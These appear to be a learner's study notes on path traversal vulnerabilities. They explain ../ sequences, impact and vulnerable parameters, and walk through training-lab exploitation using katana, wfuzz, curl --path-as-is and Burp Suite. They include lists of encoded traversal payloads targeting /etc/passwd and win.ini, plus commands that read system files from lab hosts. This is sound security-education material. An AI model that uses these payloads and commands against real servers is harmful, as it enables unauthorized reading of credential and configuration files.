- Path Traversal (also called Directory Traversal) is a bug in websites where an attacker can trick the site into opening files it should not open.
- ==Attacker manipulates file paths to access files outside the intended (considered) directory.==
- Normally, a site may only allow you to access safe files (like your own uploads). But if the code is careless, an attacker can add special characters to the file path to "climb out" of the allowed folder and peek into other parts of the server.

  Path traversal occurs when:

    - Application uses user input to access files
    - Attacker manipulates the path using ../ sequences
    - Attacker escapes the intended directory
    - Attacker reads sensitive system files


### ğŸ—‚ How it works

- `../` means â€œgo up one folderâ€ in a file path.Â 
- By repeating it (`../../../../`), you can go back multiple folders.Â 

In file systems:

-    . = Current directory
-    .. = Parent directory (go up one level)

Example:

Website expects:

"`http://example.com/download.php?file=myreport.pdf`"

Attacker tries:

"[http://example.com/download.php?file=../../../../etc/passwd](http://example.com/download.php?file=../../../../etc/passwd)"

ğŸ“‚ This might give access to a system file (like `/etc/passwd` on Linux).

### Absolute Path:

Full path to a file or folder.

Starts from the root directory (/ in Linux, drive letter in Windows).

ex: /home/ak/Documents/report.txt(linux)

Â Â Â Â Â  C:\Windows\System32\drivers\etc\hosts

## Relative Path

- Path written relative to your current working directory.Â 
- Shorter and flexible but depends on where you run it from.

Â Â Â Â Â  ex: Documents/report.txtÂ Â  â†’ means /home/ak/Documents/report.txt

## ğŸ”¹ In Cybersecurity Context

- Absolute paths are often seen in error messages â†’ can leak server structure (info disclosure).[[4.Information disclosure]]Â 
- Relative paths are often abused in Path Traversal / LFI attacks:

`../../../../etc/passwd`

â†’ goes up directories relative to the vulnerable scriptâ€™s location.

  
  **Directory structure:**
```
/
â”œâ”€â”€ etc
â”‚   â”œâ”€â”€ passwd         â† Target file!
â”‚   â”œâ”€â”€ shadow
â”‚   â””â”€â”€ hosts
â”œâ”€â”€ var
â”‚   â””â”€â”€ www
â”‚       â””â”€â”€ html
â”‚           â”œâ”€â”€ images     â† Application's intended directory
â”‚           â”‚   â”œâ”€â”€ product1.jpg
â”‚           â”‚   â””â”€â”€ product2.jpg
â”‚           â””â”€â”€ index.php
â””â”€â”€ home
    â””â”€â”€ carlos
        â””â”€â”€ secret.txt
```

**The traversal path:**

```
Starting point: /var/www/html/images/

../              = /var/www/html/
../../           = /var/www/
../../../        = /var/
../../../../     = /
../../../../etc/passwd = /etc/passwd

SUCCESS! Escaped to read system file!
```

## âš ï¸ Impact of Path Traversal

1. Stealing sensitive files
    - Attackers can read files they shouldnâ€™t.
    - Examples:
        - `/etc/passwd` or `/etc/shadow` (Linux user accounts)Â 
        - `C:\Windows\win.ini` (Windows system info)Â 
        - Application config files â†’ may contain database usernames/passwords.Â 

2.Â Â  Leaking source code

- Attackers can open the websiteâ€™s own code files (e.g., `.php`, `.asp`, `.java`).Â 
- This reveals how the app works and helps them find more weaknesses.Â Â Â 

3.Â Â  Finding hidden information

- Error logs, backup files, environment variables.
- These can contain API keys, session tokens, or internal server details.

4.Â  Stepping stone to bigger attacks

- If the attacker can both read and write files (e.g., via file upload), they may place a webshell or malicious code on the server â†’ leading to Remote Code Execution (RCE).Â Â Â 

## ğŸ“‚ Parameters vulnerable to Path Traversal

Path Traversal usually happens when parameters are used to handle files. Some common ones:

- `file` â†’ `?file=../../../../etc/passwd`Â 
- `page` â†’ `?page=../../../../windows/win.ini`Â 
- `doc` â†’ `?doc=../../../../etc/hosts`Â 
- `folder` / `dir` â†’ `?dir=../../../../var/log/`Â 
- `template` â†’ `?template=../../../../config/config.php`Â 
- `lang` (for language files) â†’ `?lang=../../../../etc/passwd`


## ğŸš¨ Why parameters matter

- If user input (parameter values) is placed directly into file paths without validation, attackers can insert `../` sequences.Â 
- This lets them escape the intended folder and read sensitive files.

âœ… In short:

- Parameters = inputs in the URL (like `?file=something`).Â 
- If these parameters are not secured, attackers can exploit them with path traversal payloads.

âœ… Summary:

- Path Traversal = accessing files outside allowed directoryÂ 
- LFI = including local files on the serverÂ 
- RFI = including remote files (can lead to remote code execution)

#### Basic Payloads
```LINUX
 ../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252f..%252fetc/passwd
/etc/passwd
```

```WINDOWS
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows\win.ini
....\\....\\....\\windows\\win.ini
C:\windows\win.ini
```
# LAB

## 1. Katana-Â 

copy url of website and use katana to find parameters like filename, page etc.Â 

Â Â Â Â Â Â Â  katana -u [https://0a0000be048d54d880c25337003b0004.web-security-academy.net/](https://0a0000be048d54d880c25337003b0004.web-security-academy.net/)

## 2.wfuzz -

It sends a large number of requests to a web server, inserting test values (from wordlists) into places you choose, to discover hidden files, parameters, vulnerabilities, or misconfigurations.

Think of it like an automated trial-and-error tool for web pentesting.

Fuzzing is a security testing technique where you send a large number of unexpected, random, or specially crafted inputs to a program, website, or system to see how it reacts.

The goal is to find:

- CrashesÂ 
- ErrorsÂ 
- Unexpected behaviorÂ 
- Security vulnerabilities (like buffer overflows, injections, or leaks)

  

```
wfuzz -c -u https://0a0000be048d54d880c25337003b0004.web-security-academy.net/image?filename=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --sc 200
```

- here add FUZZ in the end of url and remove img or etc find from katan.
- add wordlist for attack.

## 3.curl-

now check the content of file by adding result of wfuzz in the end of target url.

```
curl https://0a0000be048d54d880c25337003b0004.web-security-academy.net/image?filename="../../../../../../etc/passwd&=%3C%3C%3C%3C"
```

# lab1

1. capture the image request in burpsuite and send to repeater.

Â Â Â Â Â Â Â Â Â  Â Â  example: GET /image?filename=53.jpg HTTP/2

2. now edit this request after filename=../../../../etc/passwd or other payload like ../../../../etc/group and send it.
3. now we can see password and groups

or we can do it without burpsuite

- inspect the image on Firefox in source code you get filename= parameter which loads the image
- copy the parameter and add it at the end of URL and use curl tool.
```
- curl --path-as-is <url+image?filename=../../../../etc/passwd.
```

## or we can use curl

copy the url of image request and then

```
curl --path-as-is https://0ab300cd040b65688081bc9d00210057.web-security-academy.net/image?filename= <add yor payload ex= ../../../../etc/passwd>
```

## lab2

read absolute/relative path first.

```
1. access the lab and capture the image request and send it to intruder.Â  Â Â Â Â Â Â Â Â  ex=https://0a3400d204ac775f80883a7500010041.web-security-academy.net/image?filename=22.jpg
```
1. in intruder select the (GET /image?filename=$22.jpg$ HTTP/1.1) ($22.jpg$) select it and tap on add thn load and use path-traversal payload list for brute force attack.

## lab3

same as lab 2

- use-curl
- use-intruder for bruteforce using payload automatically
- use repeater to check one by one payload manually